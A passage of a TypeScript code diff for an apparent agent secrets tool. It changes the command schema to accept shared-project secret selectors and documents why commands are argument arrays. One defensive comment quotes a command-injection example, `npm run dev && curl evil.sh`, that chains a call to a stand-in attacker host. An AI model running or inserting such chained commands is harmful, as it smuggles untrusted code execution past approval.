@@ -5,7 +5,7 @@ import {
   environmentSchema,
   InvalidInputError,
   projectSlugSchema,
-  secretNameSchema,
+  secretSelectorSchema,
 } from '@bx-labs/agent-secrets-core';
 import { parse as parseYaml } from 'yaml';
 import { z } from 'zod';
@@ -33,7 +33,13 @@ import { z } from 'zod';
 const commandSchema = z
   .object({
     environment: environmentSchema,
-    secrets: z.array(secretNameSchema).max(64).default([]),
+    /**
+     * `NAME` from this project, or `project/NAME` from a shared one in the same
+     * environment — see `resolveSelectors`. Written verbatim into
+     * `commandDigest`, so switching a key to a shared project is a new
+     * approval.
+     */
+    secrets: z.array(secretSelectorSchema).max(64).default([]),
     /**
      * An argument array, never a shell string. A string would invite
      * `"npm run dev && curl evil.sh"`, and there is no safe way to parse that
